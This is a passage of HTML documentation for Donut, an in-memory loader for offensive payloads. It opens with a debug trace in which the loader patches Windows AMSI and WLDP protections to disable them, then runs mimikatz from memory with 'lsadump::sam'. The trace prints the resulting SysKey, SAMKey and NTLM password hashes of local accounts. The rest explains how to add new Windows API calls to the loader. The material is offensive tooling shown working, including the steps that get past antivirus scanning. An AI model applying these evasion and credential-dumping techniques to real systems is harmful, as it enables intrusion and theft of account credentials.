DEBUG: peb.c:87:FindExport(): ff0605e1258bee44 is forwarded to api-ms-win-core-com-l1-1-0.CoUninitialize
DEBUG: peb.c:110:FindExport(): Trying to load api-ms-win-core-com-l1-1-0.dll
DEBUG: peb.c:114:FindExport(): Calling GetProcAddress(CoUninitialize)
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for D5CEDA5C642834D7
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for A69EAF72442222A4
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 4DBA40D90962E1D6
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for A1143A47656B2526
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 62FF88CDC045477E
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for E20BCE2C11E82C7B
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for A469294ED1E1D8DC
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 61E26E7C5DD38D2C
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 145C8CF24F5EAF3E
DEBUG: loader/loader.c:196:MainProc(): Resolving API address for 12ACA3AD3CC20AF5
DEBUG: loader/loader.c:218:MainProc(): Module is embedded.
DEBUG: bypass.c:112:DisableAMSI(): Length of AmsiScanBufferStub is 36 bytes.
DEBUG: bypass.c:122:DisableAMSI(): Overwriting AmsiScanBuffer
DEBUG: bypass.c:137:DisableAMSI(): Length of AmsiScanStringStub is 36 bytes.
DEBUG: bypass.c:147:DisableAMSI(): Overwriting AmsiScanString
DEBUG: loader/loader.c:226:MainProc(): DisableAMSI OK
DEBUG: bypass.c:326:DisableWLDP(): Length of WldpQueryDynamicCodeTrustStub is 20 bytes.
DEBUG: bypass.c:350:DisableWLDP(): Length of WldpIsClassInApprovedListStub is 36 bytes.
DEBUG: loader/loader.c:232:MainProc(): DisableWLDP OK
DEBUG: loader/loader.c:239:MainProc(): Compression engine is 5
DEBUG: loader/loader.c:242:MainProc(): Allocating 1015240 bytes of memory for decompressed file and module information
DEBUG: loader/loader.c:252:MainProc(): Duplicating DONUT_MODULE
DEBUG: loader/loader.c:256:MainProc(): Decompressing 478726 -> 1013912
DEBUG: loader/loader.c:270:MainProc(): WorkSpace size : 1415999 | Fragment size : 5161
DEBUG: loader/loader.c:277:MainProc(): Decompressing with RtlDecompressBufferEx(XPRESS HUFFMAN)
DEBUG: loader/loader.c:302:MainProc(): Checking type of module
DEBUG: inmem_pe.c:103:RunPE(): Allocating 1019904 (0xf9000) bytes of RWX memory for file
DEBUG: inmem_pe.c:112:RunPE(): Copying Headers
DEBUG: inmem_pe.c:115:RunPE(): Copying each section to RWX memory 00000178FF170000
DEBUG: inmem_pe.c:127:RunPE(): Applying Relocations
DEBUG: inmem_pe.c:151:RunPE(): Processing the Import Table
DEBUG: inmem_pe.c:159:RunPE(): Loading ADVAPI32.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading Cabinet.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading CRYPT32.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading cryptdll.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading DNSAPI.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading FLTLIB.DLL
DEBUG: inmem_pe.c:159:RunPE(): Loading NETAPI32.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading ole32.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading OLEAUT32.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading RPCRT4.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading SHLWAPI.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading SAMLIB.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading Secur32.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading SHELL32.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading USER32.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading USERENV.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading VERSION.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading HID.DLL
DEBUG: inmem_pe.c:159:RunPE(): Loading SETUPAPI.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading WinSCard.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading WINSTA.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading WLDAP32.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading advapi32.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading msasn1.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading ntdll.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading netapi32.dll
DEBUG: inmem_pe.c:159:RunPE(): Loading KERNEL32.dll
DEBUG: inmem_pe.c:182:RunPE(): Replacing KERNEL32.dll!ExitProcess with ntdll!RtlExitUserThread
DEBUG: inmem_pe.c:159:RunPE(): Loading msvcrt.dll
DEBUG: inmem_pe.c:182:RunPE(): Replacing msvcrt.dll!exit with ntdll!RtlExitUserThread
DEBUG: inmem_pe.c:182:RunPE(): Replacing msvcrt.dll!_cexit with ntdll!RtlExitUserThread
DEBUG: inmem_pe.c:182:RunPE(): Replacing msvcrt.dll!_exit with ntdll!RtlExitUserThread
DEBUG: inmem_pe.c:196:RunPE(): Processing Delayed Import Table
DEBUG: inmem_pe.c:204:RunPE(): Loading bcrypt.dll
DEBUG: inmem_pe.c:204:RunPE(): Loading ncrypt.dll
DEBUG: inmem_pe.c:319:RunPE(): Setting command line: MTFM lsadump::sam exit
DEBUG: inmem_pe.c:433:SetCommandLineW(): Obtaining handle for kernelbase
DEBUG: inmem_pe.c:449:SetCommandLineW(): Searching 2161 pointers
DEBUG: inmem_pe.c:458:SetCommandLineW(): BaseUnicodeCommandLine at 00007FFFD1609E70 : loader  instance
DEBUG: inmem_pe.c:466:SetCommandLineW(): New BaseUnicodeCommandLine at 00007FFFD1609E70 : MTFM lsadump::sam exit
DEBUG: inmem_pe.c:483:SetCommandLineW(): New BaseAnsiCommandLine at 00007FFFD1609E60 : MTFM lsadump::sam exit
DEBUG: inmem_pe.c:530:SetCommandLineW(): Setting ucrtbase.dll!__p__acmdln "loader  instance" to "MTFM lsadump::sam exit"
DEBUG: inmem_pe.c:543:SetCommandLineW(): Setting ucrtbase.dll!__p__wcmdln "loader  instance" to "MTFM lsadump::sam exit"
DEBUG: inmem_pe.c:530:SetCommandLineW(): Setting msvcrt.dll!_acmdln "loader  instance" to "MTFM lsadump::sam exit"
DEBUG: inmem_pe.c:543:SetCommandLineW(): Setting msvcrt.dll!_wcmdln "loader  instance" to "MTFM lsadump::sam exit"
DEBUG: inmem_pe.c:323:RunPE(): Wiping Headers from memory
DEBUG: inmem_pe.c:332:RunPE(): Creating thread for entrypoint of EXE : 00000178FF2007F8


  .#####.   mimikatz 2.2.0 (x64) #18362 Aug 14 2019 01:31:47
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::sam
Domain : DESKTOP-B888L2R
SysKey : b43927eef0f56833c527ea951c37abc1
Local SID : S-1-5-21-1047138248-288568923-692962947

SAMKey : f1813d42812fcde9c5fe08807370613d

RID  : 000001f4 (500)
User : Administrator

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: c288f1c30b232571b0222ae6a5b7d223

RID  : 000003e9 (1001)
User : john
  Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c

RID  : 000003ea (1002)
User : user
  Hash NTLM: 5835048ce94ad0564e29a924a03510ef

RID  : 000003eb (1003)
User : test

mimikatz(commandline) # exit
Bye!

DEBUG: inmem_pe.c:338:RunPE(): Process terminated
DEBUG: inmem_pe.c:349:RunPE(): Erasing 1019904 bytes of memory at 00000178FF170000
DEBUG: inmem_pe.c:353:RunPE(): Releasing memory
DEBUG: loader/loader.c:343:MainProc(): Erasing RW memory for instance
DEBUG: loader/loader.c:346:MainProc(): Releasing RW memory for instance
DEBUG: loader/loader.c:354:MainProc(): Returning to caller
</pre>

<p>Obviously you should be cautious with what files you decide to execute on your machine.</p>

<h2 id="loader">13. Extending The Loader</h2>

<p>Donut was never designed with modularity in mind, however, a new version in future will try to simplify the process of extending the loader, so that others can write their own code for it. Currently, simple changes to the loader can sometimes require lots of changes to the entire code base and this isn't really ideal. If for any reason you want to update the loader to include additional functionality, the following steps are required.</p>

<h3>1. Declare the function pointers</h3>

<p>For each API you want the loader to use, declare a function pointer in loader/winapi.h. For example, the <code>Sleep</code> API is declared in its SDK header file as:</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#400000; '>Sleep</span><span style='color:#808030; '>(</span><span style='color:#603000; '>DWORD</span> dwMilliseconds<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
</pre>

<p>The function pointer for this would be declared in loader/winapi.h as:</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>(</span><span style='color:#603000; '>WINAPI</span> <span style='color:#808030; '>*</span>Sleep_t<span style='color:#808030; '>)</span><span style='color:#808030; '>(</span><span style='color:#603000; '>DWORD</span> dwMilliseconds<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
</pre>

<h3>2. Update the API string array and function pointer array</h3>

<p>At the moment, Donut resolves API using a 64-bit hash, which is calculated by the generator before being stored in the loader itself. In donut.c is a variable called <var>api_imports</var>, declared as an array of <code>API_IMPORT</code> structures.  Each entry contains a case-sensitive API string and corresponding DLL string in lowercase. The <code>Sleep</code> API is exported by kernel32.dll, so if we want the loader to use Sleep, the <code>api_imports</code> must have the following added to it. This array is terminated by an empty entry.</p>

<pre style='color:#000000;background:#ffffff;'>  <span style='color:#800080; '>{</span>KERNEL32_DLL<span style='color:#808030; '>,</span> <span style='color:#800000; '>"</span><span style='color:#0000e6; '>Sleep</span><span style='color:#800000; '>"</span><span style='color:#800080; '>}</span><span style='color:#808030; '>,</span>
</pre>

<p>Of course, KERNEL32_DLL used here is a symbolic constant for "kernel32.dll".</p>

<p>The <code>DONUT_INSTANCE</code> structure is defined in include/donut.h and one of the fields called <code>api</code> is defined as a union to hold three members. <var>hash</var> is an array of <code>uint64_t</code> integers to hold a 64-bit hash of each API string. <var>addr</var> is an array of <code>void*</code> pointers to hold the address of an API in memory and finally a structure holding all the function pointers. These pointers are placed in the same order as the API strings stored in <var>api_imports</var>. Currently, the <var>api</var> member can hold up to 64 function pointers or hashes, but this can be increased if required.</p> 

<p>Where you place the API string in <var>api_imports</var> is entirely up to you, but it <em>must</em> be in the same order as where the function pointer is placed in the <code>DONUT_INSTANCE</code> structure.</p>

<h3>3. Update DLL names</h3>

<p>A number of DLL are already loaded by a process; ntdll.dll, kernel32.dll and kernelbase.dll. For everything else, the instance contains a list of DLL strings loaded before attempting to resolve the address of APIs. The following list of DLLs seperated by semi-colon are loaded prior to resolving API. If the API you want Donut loader to use is exported by a DLL not shown here, you need to add it to the list.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#696969; '>// required for each API used by the loader</span>
<span style='color:#004a43; '>#</span><span style='color:#004a43; '>define</span><span style='color:#004a43; '> DLL_NAMES </span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>ole32;oleaut32;wininet;mscoree;shell32;dnsapi</span><span style='color:#800000; '>"</span>
</pre>

<h3>4. Calling an API</h3>

<p>If the API were successfully resolved, simply referencing the function pointer in a pointer to <code>DONUT_INSTANCE</code> is enough to invoke it. The following line of code shows how to call the <code>Sleep</code> API declared earlier.</p>

<pre style='color:#000000;background:#ffffff;'>inst<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>api<span style='color:#808030; '>.</span><span style='color:#400000; '>Sleep</span><span style='color:#808030; '>(</span><span style='color:#008c00; '>1000</span><span style='color:#808030; '>*</span><span style='color:#008c00; '>5</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
</pre>

<p>Future plans for Donut are to provide multiple options for resolving API; Import Address Table (IAT), Export Address Table (EAT) and <a href="https://modexp.wordpress.com/2019/05/19/shellcode-getprocaddress/">Exception Directory</a> to name a few. It should also be much easier to write custom payloads using the loader.</p>

</body>
</html>
